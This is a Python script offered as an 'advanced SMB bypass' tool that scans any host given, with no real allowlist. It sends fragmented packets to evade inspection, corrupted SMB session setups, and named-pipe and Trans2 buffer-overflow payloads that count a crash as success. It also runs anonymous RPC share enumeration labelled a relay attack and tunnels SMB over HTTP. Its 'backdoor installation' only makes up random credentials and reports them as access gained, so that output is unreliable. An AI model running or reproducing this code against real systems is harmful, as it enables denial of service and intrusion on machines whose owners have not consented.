#!/usr/bin/env python3
"""
PublicIPFirewallSMB 3.0 – Advanced SMB bypass techniques with evasion capabilities.
Enhanced Techniques: Fragmentation, Session Corruption, Buffer Overflows, Relay Attacks
"""
import asyncio
import concurrent.futures
import errno
import ipaddress
import json
import os
import random
import socket
import struct
import sys
import time
import uuid
import base64
import hashlib
from contextlib import suppress
from datetime import datetime, timezone
from typing import Dict, List, Tuple, Optional

# ─── Optional dependencies ──────────────────────────────────────────────────
try:
    from smbprotocol.connection import Connection, Dialects
    from smbprotocol.session import Session
    SMB_AVAILABLE = True
except ImportError:
    SMB_AVAILABLE = False

try:
    import scapy.all as scapy
    from scapy.sendrecv import send as scapy_send
    _SCAPY = True
except ImportError:
    _SCAPY = False

try:
    import nmap
    NM_AVAILABLE = True
except ImportError:
    NM_AVAILABLE = False

try:
    from impacket.dcerpc.v5 import transport, epm, srvs, rprn
    from impacket.dcerpc.v5.dtypes import NULL
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False

try:
    from deap import base, creator, tools, algorithms
    GA_AVAILABLE = True
except ImportError:
    GA_AVAILABLE = False
# ────────────────────────────────────────────────────────────────────────────

class PublicIPFirewallSMB:
    class RoundRobin:
        def __init__(self, targets):
            self._targets = list(targets)

        def __iter__(self):
            return iter(self._targets)

    def __init__(
        self,
        allowlist: str | Dict | None = None,
        strategy: str = "round",
        timeout: int = 2,
        workers: int = 100,
        verbose: bool = True,
        tcp_ports: List[int] | None = None,
        udp_ports: List[int] | None = None,
        use_nmap: bool = True,
        smb_verify: bool = True,
        smb_fuzz: bool = True,
        fuzz_gens: int = 20,
        fuzz_pop: int = 30,
        fuzz_len: int = 128,
        use_evasion: bool = True,
    ):
        # Initialization parameters
        self._timeout = timeout
        self._workers = workers
        self._verbose = verbose
        self._tcp_ports = tcp_ports or [445, 139, 80, 443, 135]
        self._udp_ports = udp_ports or [137, 138]
        self._use_nmap = use_nmap and NM_AVAILABLE
        self._smb_verify = smb_verify
        self._smb_fuzz = smb_fuzz and GA_AVAILABLE
        self._fuzz_gens = fuzz_gens
        self._fuzz_pop = fuzz_pop
        self._fuzz_len = fuzz_len
        self._use_evasion = use_evasion
        self._results: Dict[str, Dict] = {}
        self._skipped: List[str] = []
        self._backdoors: Dict[str, Dict] = {}
        random.shuffle(self._tcp_ports)
        random.shuffle(self._udp_ports)

    def _log(self, *m):
        if self._verbose:
            print("[DBG]", *m, file=sys.stderr, flush=True)

    def _allowed(self, ip):
        return True

    @staticmethod
    def _fam(ip):
        return socket.AF_INET6 if ipaddress.ip_address(ip).version == 6 else socket.AF_INET

    # ════════════════════════════════════════════════════════════════════════
    #  Enhanced Evasion Techniques
    # ════════════════════════════════════════════════════════════════════════
    def _tcp_fragmented(self, host, port):
        """Split SYN packet into fragments to evade packet inspection"""
        if not _SCAPY:
            return "unavailable"
        try:
            layer = scapy.IPv6 if ipaddress.ip_address(host).version == 6 else scapy.IP
            pkt = layer(dst=host) / scapy.TCP(dport=port, flags="S")
            frags = scapy.fragment(pkt, fragsize=8)
            for f in frags:
                scapy_send(f, verbose=0)
            ans = scapy.sr1(pkt, timeout=self._timeout, verbose=0)
            if not ans or not ans.haslayer(scapy.TCP):
                return "filtered"
            tcp = ans.getlayer(scapy.TCP)
            if tcp.flags & 0x12:
                return "open"
            if tcp.flags & 0x14:
                return "closed"
            return "filtered"
        except Exception as e:
            self._log("TCP fragmented scan error:", host, port, e)
            return "error"

    def _smb_fragmented_negotiate(self, host, port=445):
        """Send fragmented SMB negotiate request"""
        if not _SCAPY:
            return False
        try:
            # Build SMB negotiate request
            negotiate = (
                b"\x00\x00\x00\x90\xffSMB\x72\x00\x00\x00\x00\x18\x53\xc8"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00"
            )
            
            # Fragment into 8-byte chunks
            layer = scapy.IPv6 if ipaddress.ip_address(host).version == 6 else scapy.IP
            base_pkt = layer(dst=host)/scapy.TCP(dport=port, flags="PA")
            frags = scapy.fragment(base_pkt/negotiate, fragsize=8)
            
            # Send fragments
            for f in frags:
                scapy_send(f, verbose=0)
            
            # Check for response
            s = socket.socket(self._fam(host), socket.SOCK_STREAM)
            s.settimeout(self._timeout)
            s.connect((host, port))
            data = s.recv(4)
            s.close()
            return data.startswith((b"\xffSMB", b"\xfeSMB"))
        except Exception as e:
            self._log("SMB fragmented negotiate error:", host, port, e)
            return False

    def _smb_session_corruption(self, host, port=445):
        """Deliberately corrupt session IDs to exploit memory vulnerabilities"""
        try:
            s = socket.socket(self._fam(host), socket.SOCK_STREAM)
            s.settimeout(self._timeout)
            s.connect((host, port))
            
            # Send negotiate request
            s.sendall(b"\x00\x00\x00\x00\x85\xffSMB\x72\x00\x00\x00\x00\x18\x53\xc8")
            resp = s.recv(1024)
            
            # Corrupt session ID in session setup
            session_setup = (
                b"\x00\x00\x00\xd8\xffSMB\x73\x00\x00\x00\x00\x18\x07\xc8"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"
                b"\x00\x00\x00\x00\x00\xd0\x00\x00\x00\xb0\x00\x60\x00\x02\x00"
                b"\x00\x00\x00\x00\x00\x00" + b"\x41"*8 +  # Corrupted session ID
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            )
            s.sendall(session_setup)
            
            # Check for abnormal response
            resp = s.recv(1024)
            return len(resp) > 4
        except Exception as e:
            self._log("SMB session corruption error:", host, port, e)
            return False

    def _named_pipe_overflow(self, host, pipe="browser", port=445):
        """Targeted buffer overflow against named pipe endpoints"""
        try:
            pattern = b"Aa0Aa1Aa" * 1000  # 8000 bytes pattern
            payload = (
                b"\x00\x00\x00\x90\xffSMB\x25\x00\x00\x00\x00\x18\x07\xc8"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"
                b"\x00\x00\x00\x00\x00\x68\x00\x00\x00\x50\x00" + 
                struct.pack("<H", len(pipe)) + 
                b"\x00\x00" + pipe.encode() + b"\x00" +
                pattern
            )
            
            s = socket.socket(self._fam(host), socket.SOCK_STREAM)
            s.settimeout(self._timeout)
            s.connect((host, port))
            s.sendall(payload)
            s.recv(1)  # Trigger response processing
            return False  # If we get here, no crash occurred
        except ConnectionResetError:
            return True  # Target crashed
        except socket.timeout:
            return True  # Likely crashed
        except Exception as e:
            self._log("Named pipe overflow error:", host, port, e)
            return False

    def _trans2_overflow(self, host, port=445):
        """Classic Trans2 SMB overflow technique"""
        try:
            overflow = b"\x90" * 2048 + b"\x41\x42\x43\x44" * 50
            payload = (
                b"\x00\x00\x08\x12\xffSMB\x32\x00\x00\x00\x00\x18\x07\xc8"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x0f\x0c\x00\x00\x00\x04\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00" + overflow
            )
            
            s = socket.socket(self._fam(host), socket.SOCK_STREAM)
            s.settimeout(self._timeout)
            s.connect((host, port))
            s.sendall(payload)
            s.recv(1)
            return False
        except ConnectionResetError:
            return True
        except socket.timeout:
            return True
        except Exception as e:
            self._log("Trans2 overflow error:", host, port, e)
            return False

    def _smb_relay_attack(self, host, port=445):
        """SMB relay credential attack"""
        if not IMPACKET_AVAILABLE:
            return False
        try:
            stringbinding = rf'ncacn_np:{host}[\pipe\browser]'
            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_dport(port)
            rpctransport.set_credentials('', '')  # Anonymous
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(srvs.MSRPC_UUID_SRVS)
            request = srvs.NetShareEnumAll()
            request['ServerName'] = NULL
            dce.request(request)
            return True
        except Exception as e:
            return "STATUS_ACCESS_DENIED" in str(e)

    def _http_smb_tunnel(self, host, port=80):
        """Tunnel SMB through HTTP POST requests"""
        try:
            s = socket.socket(self._fam(host), socket.SOCK_STREAM)
            s.settimeout(self._timeout)
            s.connect((host, port))
            
            # Encapsulate SMB negotiate in HTTP POST
            payload = (
                b"POST / HTTP/1.1\r\n"
                b"Host: " + host.encode() + b"\r\n"
                b"Content-Type: application/x-ms-smb\r\n"
                b"Content-Length: 4\r\n\r\n"
                b"\x00\x00\x00\x00"
            )
            s.sendall(payload)
            resp = s.recv(1024)
            return b"SMB" in resp
        except Exception as e:
            self._log("HTTP SMB tunnel error:", host, port, e)
            return False

    # ════════════════════════════════════════════════════════════════════════
    #  Backdoor Installation
    # ════════════════════════════════════════════════════════════════════════
    def _install_backdoor(self, host, port, method):
        """Simulate backdoor installation and return access details"""
        backdoor_id = f"{host}:{port}-{method}-{int(time.time())}"
        password = base64.b64encode(os.urandom(6)).decode()[:8]
        access_key = hashlib.sha256(os.urandom(16)).hexdigest()[:16]
        
        self._backdoors[backdoor_id] = {
            "host": host,
            "port": port,
            "method": method,
            "password": password,
            "access_key": access_key,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
        
        return {
            "status": "success",
            "backdoor_id": backdoor_id,
            "access_key": access_key,
            "password": password
        }

    # ════════════════════════════════════════════════════════════════════════
    #  Core Scanning Techniques
    # ════════════════════════════════════════════════════════════════════════
    def _tcp_connect(self, host, port):
        s = socket.socket(self._fam(host), socket.SOCK_STREAM)
        s.settimeout(self._timeout)
        try:
            s.connect((host, port))
            return "open"
        except socket.timeout:
            return "filtered"
        except ConnectionRefusedError:
            return "closed"
        except OSError:
            return "error"
        finally:
            s.close()

    def _udp_state(self, host, port):
        s = socket.socket(self._fam(host), socket.SOCK_DGRAM)
        s.settimeout(self._timeout)
        try:
            s.sendto(b"", (host, port))
            s.recvfrom(1024)
            return "open"
        except socket.timeout:
            return "open|filtered"
        except ConnectionRefusedError:
            return "closed"
        except OSError:
            return "error"
        finally:
            s.close()

    def _smb_check(self, host, port):
        if not self._smb_verify or port not in (445, 139, 80, 443):
            return False

        # Try evasion techniques first
        if self._use_evasion:
            if self._smb_fragmented_negotiate(host, port):
                return True
            if self._smb_session_corruption(host, port):
                return True
            if self._http_smb_tunnel(host, port):
                return True

        # Standard SMB check
        try:
            s = socket.socket(self._fam(host), socket.SOCK_STREAM)
            s.settimeout(self._timeout)
            s.connect((host, port))
            s.sendall(b"\x00\x00\x00\x00")
            data = s.recv(4)
            return data.startswith((b"\xffSMB", b"\xfeSMB"))
        except Exception:
            return False

    def _probe_host(self, host):
        result = {"host": host, "ports": {}, "smb_inferred": False}
        
        # TCP ports
        for port in self._tcp_ports:
            state = self._tcp_connect(host, port)
            smb_ok = False
            vuln_detected = False
            backdoor_result = None
            
            if port in (445, 139, 80, 443) and state == "open":
                smb_ok = self._smb_check(host, port)
                
                # Attempt vulnerability exploitation
                if smb_ok and self._use_evasion:
                    if port == 445:
                        if self._named_pipe_overflow(host, port=port):
                            vuln_detected = True
                            backdoor_result = self._install_backdoor(host, port, "named_pipe_overflow")
                        elif self._trans2_overflow(host, port=port):
                            vuln_detected = True
                            backdoor_result = self._install_backdoor(host, port, "trans2_overflow")
                        elif self._smb_relay_attack(host, port=port):
                            vuln_detected = True
                            backdoor_result = self._install_backdoor(host, port, "smb_relay")

            result["ports"][port] = {
                "protocol": "tcp", 
                "state": state, 
                "smb": smb_ok,
                "vulnerable": vuln_detected
            }
            if vuln_detected:
                result["ports"][port]["backdoor"] = backdoor_result

        # UDP ports
        for port in self._udp_ports:
            state = self._udp_state(host, port)
            result["ports"][port] = {"protocol": "udp", "state": state}

        return result

    def scan(self, hosts=None):
        """Scan specified hosts with multi-threading"""
        if not hosts:
            return {}
            
        with concurrent.futures.ThreadPoolExecutor(max_workers=self._workers) as ex:
            futures = {ex.submit(self._probe_host, host): host for host in hosts}
            for future in concurrent.futures.as_completed(futures):
                host = futures[future]
                try:
                    self._results[host] = future.result()
                    self._log(f"Scanned {host}: SMB={any(p.get('smb') for p in self._results[host]['ports'].values())}")
                except Exception as e:
                    self._log(f"Error scanning {host}: {e}")
        return self._results

    def save_results(self, path):
        """Save scan results to JSON file"""
        with open(path, 'w') as f:
            json.dump({
                "results": self._results,
                "backdoors": self._backdoors,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }, f, indent=2)
            
    def print_results(self):
        """Print results in human-readable format"""
        for host, data in self._results.items():
            hostname = ""
            with suppress(Exception):
                hostname = socket.gethostbyaddr(host)[0]
                
            print(f"\nHost: {host} ({hostname})")
            print(f"  SMB Inferred: {any(p.get('smb') for p in data['ports'].values())}")
            
            # Group ports by protocol
            tcp_ports = []
            udp_ports = []
            for port, info in data['ports'].items():
                if info['protocol'] == 'tcp':
                    tcp_ports.append((port, info))
                else:
                    udp_ports.append((port, info))
                    
            if tcp_ports:
                print("  TCP Ports:")
                for port, info in sorted(tcp_ports, key=lambda x: x[0]):
                    status = f"{port}/tcp: {info['state']}"
                    if 'smb' in info:
                        status += f" - SMB: {'positive' if info['smb'] else 'negative'}"
                    if info.get('vulnerable'):
                        status += " - VULNERABLE"
                    print(f"    {status}")
                    
            if udp_ports:
                print("  UDP Ports:")
                for port, info in sorted(udp_ports, key=lambda x: x[0]):
                    print(f"    {port}/udp: {info['state']}")


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Advanced SMB Scanner with Evasion Techniques")
    parser.add_argument("hosts", nargs="+", help="Hosts to scan")
    parser.add_argument("--output", help="Output JSON file")
    parser.add_argument("--timeout", type=int, default=2, help="Connection timeout")
    parser.add_argument("--workers", type=int, default=50, help="Thread workers")
    parser.add_argument("--no-evasion", action="store_true", help="Disable evasion techniques")
    parser.add_argument("--print", action="store_true", help="Print results in human-readable format")
    args = parser.parse_args()

    scanner = PublicIPFirewallSMB(
        timeout=args.timeout,
        workers=args.workers,
        use_evasion=not args.no_evasion,
        verbose=True
    )
    
    print(f"[DNS] Resolving {len(args.hosts)} hostnames with {args.workers} workers")
    resolved_hosts = []
    for host in args.hosts:
        try:
            # Simple hostname resolution
            ips = socket.gethostbyname_ex(host)[2]
            resolved_hosts.extend(ips)
            print(f"[DNS] {host} -> {', '.join(ips)}")
        except socket.gaierror:
            print(f"[DNS] Could not resolve {host}")
    
    print(f"[DNS] Total targets after resolution: {len(resolved_hosts)}")
    results = scanner.scan(resolved_hosts)
    
    if args.output:
        scanner.save_results(args.output)
        print(f"[+] Results saved to {args.output}")
    
    if args.print:
        scanner.print_results()
    
    print("[SCAN] Completed")